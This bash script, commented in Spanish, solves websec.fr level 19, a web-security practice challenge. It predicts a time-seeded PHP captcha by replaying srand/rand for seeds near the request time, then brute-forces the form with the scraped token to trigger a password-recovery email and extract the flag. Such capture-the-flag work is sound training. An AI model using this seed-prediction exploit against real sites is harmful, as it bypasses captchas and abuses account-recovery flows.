#!/bin/bash

COOKIE_JAR="/tmp/cookies.txt"
rm -f $COOKIE_JAR

# Obtener el timestamp ANTES de visitar la página
TIMESTAMP=$(date +%s)
echo "Timestamp antes de la petición: $TIMESTAMP"

# Visitar la página para generar el captcha
curl -s -c $COOKIE_JAR "https://websec.fr/level19/index.php" > /tmp/page1.html

TOKEN=$(grep -oP 'value="\K[^"]+(?=">)' /tmp/page1.html | tail -1)
echo "Token: $TOKEN"

# Generar captchas para timestamps alrededor del momento de la visita
for offset in $(seq -3 3); do
    seed=$((TIMESTAMP + offset))
    captcha=$(php -r "
        srand($seed);
        \$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890';
        \$text = '';
        for(\$i = 0; \$i < 25; \$i++) {
            \$text .= \$chars[rand() % strlen(\$chars)];
        }
        echo \$text;
    ")
    
    echo "Intentando seed $seed: $captcha"
    
    result=$(curl -s -b $COOKIE_JAR "https://websec.fr/level19/index.php" \
        -d "captcha=$captcha&token=$TOKEN&submit=")
    
    if echo "$result" | grep -q "Password recovery email sent"; then
        echo "¡¡¡ÉXITO!!!"
        echo "$result" | grep -oP 'WEBSEC\{[^}]+\}' || echo "Email enviado"
        break
    fi
done
